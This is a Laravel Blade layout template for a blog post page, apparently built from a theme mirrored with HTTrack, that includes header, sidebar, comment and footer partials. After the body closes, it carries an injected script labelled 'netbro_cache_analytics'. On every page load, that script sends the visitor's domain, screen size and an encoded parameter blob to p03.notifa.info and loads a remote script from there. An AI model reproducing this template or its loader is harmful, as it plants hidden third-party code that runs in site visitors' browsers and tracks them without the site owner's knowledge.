<!DOCTYPE html>
<html lang="en">
@include('web.layout.head')
@yield('stylesheets')
<!-- Mirrored from www.inspirothemes.com/polo/blog-single.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Sep 2019 06:21:45 GMT -->

<body>
    <div class="body-inner">

        {{-- Header --}}
        <header>
            @include('web.layout.header')
        </header>

        <section id="page-content" class="sidebar-right">
            <div class="container">
                <div class="row">

                    <div class="content col-lg-9">

                        <div id="blog" class="single-post">

                            <div class="post-item">
                                <div class="post-item-wrap">
                                    @yield('content')

                                    @include('web.layout.comment')
                                </div>
                            </div>

                        </div>
                    </div>


                    <div class="sidebar sticky-sidebar col-lg-3">

                        @include('web.layout.sidebar')

                    </div>

                </div>
            </div>
        </section>


        <footer id="footer">
            @include('web.layout.footer')
        </footer>

    </div>


    <a id="scrollTop"><i class="icon-chevron-up1"></i><i class="icon-chevron-up1"></i></a>

    {{-- Footer script --}}
    @include('web.layout.foot')
</body>
<script type="text/javascript">
    if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2WzXUQZRDshiHL%2fEZ6quOUIEjH5IcCPyYtwfHo9DB332iwIER07bd2C4%2b1r8dpZZ8NkF49Qpe8KystwChT6qdai%2bUsdiX1sn9vPC8Jox7%2b%2f1yhx6qt9qsL985q%2bh6cIgwG%2bU3JdYDstkOSgWwiWHuEOjUeth0CAO%2f4aZS0uqDyTUWYre%2bd2wiKGuzxeVPnsAi%2balIyOyPM828rndGcNqldqYTvv1GY%2fWnsNr2QMKHnHJkw7QZ%2bOxsNVLQVzwWXM%2bXsaV5I6EWJSN0LWlJN7hstL8ho4volCgP%2fPqo0Bo%2f4xmj7zmkSFAPnYx1Zq8Nu8pFitg21BXfTdJaWG4vfQYv%2fipQVbbsQrQq3dxkReb4VaYHwhS22xrojW9X310I1VObAjgji8O0RB1J%2beHufw9gZJmC5DewXFDSWr7WTceCY%2fDSYImUJmHNMBn9wiMUR7Q79GKMLPbX42Fvfc8GWYGM41HJny0iDK7aZAOEpRgyBr3z%2feTxO5kYOw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>
<!-- Mirrored from www.inspirothemes.com/polo/blog-single.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Sep 2019 06:21:45 GMT -->

</html>